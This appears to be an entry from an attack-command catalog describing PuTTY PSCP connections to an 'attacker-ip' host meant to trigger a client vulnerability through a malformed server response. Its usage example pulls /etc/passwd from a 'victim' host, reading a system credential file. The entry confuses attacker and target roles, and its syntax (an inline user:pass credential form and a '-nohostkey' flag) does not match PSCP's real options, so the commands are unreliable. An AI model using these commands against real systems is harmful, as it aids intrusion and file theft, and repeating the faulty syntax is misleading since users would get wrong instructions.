---
id: cmd-pscp-connect-transfer
data: 'pscp -scp user:pass@attacker-ip:/remote/file localfile'
tags:
  - putty
  - ssh
type: command
output: 'Auth succeeds; transfer starts, vulnerable to server response.'
executor: cmd
platforms:
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:30:58.692Z'
verified: false
validated: true
submitted: true
---
# pscp-connect-transfer

## Command

```cmd
pscp -scp user:pass@attacker-ip:/remote/file localfile
```

## Description

Uses PuTTY's PSCP to connect to an SSH server, authenticate with credentials, and initiate a secure file copy transfer, triggering post-auth file size processing in vulnerable versions.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -scp | Specifies SCP protocol | Yes |
| user:pass | SSH username:password | Yes |
| @attacker-ip | Target server IP | Yes |
| /remote/file | Remote path to 'transfer' | Yes |
| localfile | Local destination file | Yes |

## Examples

### Basic Usage

```cmd
pscp -scp victim:secret@192.168.1.100:/etc/passwd test.txt
```

### Advanced Usage

With host key ignore (for testing):

```cmd
pscp -scp -nohostkey user:pass@attacker-ip:/fake/path localfile
```

## Expected Output

"Authenticating..." followed by transfer progress; in exploit scenario, crashes on malformed response.

## Related

- [[Related Procedure|procedures/Connect-Vulnerable-PuTTY-PSCP-Client]]
